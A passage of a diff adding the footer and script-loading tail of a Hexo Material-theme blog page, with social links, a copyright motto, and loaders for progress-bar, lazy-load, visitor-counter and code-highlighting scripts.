+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+<!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/hac425" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5691483590" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://gitee.com/hac425/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>穷则变，变则通，通则久
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?wgjW/HuQG9JDgvPDPoRAng==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+   
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+    
+        <script>lsloader.load("hanabi","/js/hanabi-browser-bundle.js?5+2z7ZZmFuZK5IcimlZbxw==", true)</script>
+    
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+        
+        
+        HanabiBrowser.start('pre code',true);
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
